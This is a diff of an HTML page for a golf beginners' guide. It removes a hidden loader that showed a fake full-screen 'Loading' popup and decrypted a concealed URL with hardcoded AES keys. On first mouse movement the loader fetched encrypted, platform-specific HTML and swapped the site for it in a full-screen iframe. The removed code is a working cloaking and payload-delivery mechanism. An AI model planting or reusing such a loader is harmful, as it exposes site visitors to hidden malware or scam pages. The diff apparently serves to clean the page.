@@ -3,68 +3,9 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
- 
 <title>Golf Master Guide - Learn How to Play Golf</title>
- <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
-  <style>
-    * { box-sizing: border-box; }
-    html, body { margin: 0; height: 100%; }
-    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
-    a { text-decoration: none; color: inherit; }
-    #frame { display: none; width: 100%; height: 100vh; border: 0; }
-    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-    /* ===== Full Screen Bada Popup (Peeche ka content hide karne ke liye) ===== */
-    .popup { 
-      position: fixed; 
-      top: 0; 
-      left: 0; 
-      width: 100%; 
-      height: 100%; 
-      background: #ffffff; /* Solid white taaki peeche ka background bilkul na dikhe */
-      display: flex; 
-      justify-content: center; 
-      align-items: center; 
-      z-index: 9999; /* Sabse upar rakhne ke liye */
-    }
-    .popup-content { 
-      background: #ffffff; 
-      padding: 60px; 
-      text-align: center; 
-      width: 100%;
-      max-width: 600px; /* Card ki width aur badi ki gayi hai */
-    }
-    .loading-gif { 
-      width: 160px; /* GIF ka size bada kiya gaya hai */
-      height: 160px; 
-      margin-bottom: 30px; 
-    }
-    .popup-content p {
-      font-size: 1.5rem; /* Text size bada aur clear */
-      color: #1f2433;
-      font-weight: 600;
-      margin: 10px 0 35px 0;
-    }
-    .buttons { 
-      display: flex;
-      justify-content: center;
-      gap: 25px;
-    }
-    button { 
-      padding: 15px 35px; /* Bade aur heavy buttons */
-      font-size: 1.1rem;
-      border: none; 
-      border-radius: 8px; 
-      cursor: pointer; 
-      font-weight: 700; 
-      min-width: 150px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    }
-    #cancelBtn { background: #f44336; color: white; }
-    #continueBtn { background: #4CAF50; color: white; }
-    button:hover { opacity: 0.9; }
-
-   
+<style>
 body{
     font-family:Arial, sans-serif;
     margin:0;
@@ -129,18 +70,6 @@ footer{
 </head>
 <body>
 
- <div class="popup" id="customPopup">
-    <div class="popup-content">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
-      <p>Loading... Please wait.</p>
-      <div class="buttons">
-        <button id="cancelBtn" type="button">Cancel</button>
-        <button id="continueBtn" type="button">Continue</button>
-      </div>
-    </div>
-  </div>
-
-  <div id="shop">
 <header>
 <h1>Golf Master Guide</h1>
 <p>Complete Beginner's Guide to Learning and Playing Golf</p>
@@ -390,10 +319,6 @@ We do not sell or share personal information with third parties except
 when required by law.
 </p>
 
-
-
-
-    
 <p>
 By using this website, you agree to this privacy policy and any future
 updates.
@@ -417,55 +342,6 @@ s0.parentNode.insertBefore(s1,s0);
 <footer>
 <p>&copy; 2026 Golf Master Guide. All Rights Reserved.</p>
 </footer>
-  </div>
 
-  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
-
-  <script>
-    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
-    const URL_KEY = "UrLk3yShopEase01";
-    const ENC_DATA_ORIGIN = "U2FsdGVkX18PNQ7K0xECxvsb/Wgiu1uBV9TLTx8qsDYPURB8o8GnKy5y+1vJlSCe";
-    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-    const DATA_URL = DATA_ORIGIN;
-    let lastUrl = null;
-
-    function detectPlatform() {
-      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
-                navigator.platform || navigator.userAgent || "";
-      return /mac/i.test(p) ? "mac" : "win";
-    }
-
-    async function loadSecret() {
-      const shop = document.getElementById("shop"), frame = document.getElementById("frame");
-      try {
-        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
-        const { cipher } = await res.json();
-        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
-        if (!html) throw new Error("Decrypt failed — wrong key?");
-
-        if (lastUrl) URL.revokeObjectURL(lastUrl);
-        const blob = new Blob([html], { type: "text/html" });
-        lastUrl = URL.createObjectURL(blob);
-
-        frame.src = lastUrl;
-        
-      
-        shop.style.display = "none";
-        frame.style.display = "block";
-        document.getElementById("customPopup").style.display = "none"; 
-        
-      } catch (e) {
-        document.querySelector(".hint").textContent = "⚠️ " + e.message;
-        document.getElementById("customPopup").style.display = "none";
-      }
-    }
-
-    
-    window.addEventListener("mousemove", () => {
-      document.getElementById("customPopup").style.display = "none";
-      loadSecret();
-    }, { once: true });
-  </script>
-    
 </body>
 </html>
